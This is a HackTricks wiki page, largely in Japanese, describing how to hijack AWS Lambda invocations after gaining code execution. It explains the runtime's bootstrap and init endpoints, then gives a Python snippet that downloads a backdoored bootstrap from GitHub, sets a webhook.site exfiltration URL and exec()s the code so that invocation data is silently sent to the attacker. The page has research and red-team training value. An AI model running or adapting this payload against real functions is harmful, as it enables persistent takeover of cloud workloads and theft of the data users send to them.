# AWS - Steal Lambda Requests

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Lambda Flow

<figure><img src="../../../../.gitbook/assets/image (152).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer**はコンテナ外のプロセスで、**init**プロセスに**invocations**を**送信**します。
2. initプロセスはポート**9001**でいくつかの興味深いエンドポイントを公開しています：
* **`/2018-06-01/runtime/invocation/next`** – 次のinvocationイベントを取得
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** – invokeのハンドラ応答を返す
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** – 実行エラーを返す
3. **bootstrap.py**はinitプロセスからinvocationsを取得し、ユーザーコードを呼び出してそれらを処理するループを持っています（**`/next`**）。
4. 最後に、**bootstrap.py**は**response**をinitに送信します。

bootstrapはユーザーコードをモジュールとしてロードするため、ユーザーコードによって実行される任意のコード実行は実際にはこのプロセスで行われます。

## Stealing Lambda Requests

この攻撃の目的は、ユーザーコードが脆弱なリクエストを処理する**`bootstrap.py`**プロセス内で悪意のある**`bootstrap.py`**プロセスを実行するようにすることです。この方法で、**悪意のあるbootstrap**プロセスがinitプロセスと通信を開始し、リクエストを処理する一方で、**正当な**bootstrapは**悪意のあるもの**を実行しているため、initプロセスにリクエストを要求しません。

これは、ユーザーコードが正当な**`bootstrap.py`**プロセスによって実行されているため、簡単に達成できます。攻撃者は次のことができます：

* 現在のinvocationの偽の結果をinitプロセスに送信し、initがbootstrapプロセスがさらにinvocationsを待っていると考えるようにします。
* リクエストは**`/${invoke-id}/response`**に送信される必要があります。
* invoke-idは、正当な**`bootstrap.py`**プロセスのスタックから[**inspect**](https://docs.python.org/3/library/inspect.html) Pythonモジュールを使用して取得するか（[ここで提案されているように](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)）、または**`/2018-06-01/runtime/invocation/next`**に再度リクエストして取得します（[ここで提案されているように](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)）。
* 次のinvocationsを処理する悪意のある**`bootstrap.py`**を実行します。
* ステルス性のために、lambda invocationsのパラメータを攻撃者が制御するC2に送信し、通常通りリクエストを処理することが可能です。
* この攻撃のためには、システムまたは[**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py)から**`bootstrap.py`**の元のコードを取得し、悪意のあるコードを追加して現在のlambda invocationから実行するだけで十分です。

### Attack Steps

1. **RCE**脆弱性を見つけます。
2. **悪意のある** **bootstrap**を生成します（例：[https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py)）
3. 悪意のあるbootstrapを**実行**します。

これらのアクションは簡単に実行できます：
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
詳細については、[https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher) を確認してください。

## 参考文献

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
AWS Hackingを学び、練習する:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingを学び、練習する: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f) または [**telegramグループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) をフォローしてください。
* **PRを提出してハッキングトリックを共有する** [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリ。

</details>
{% endhint %}
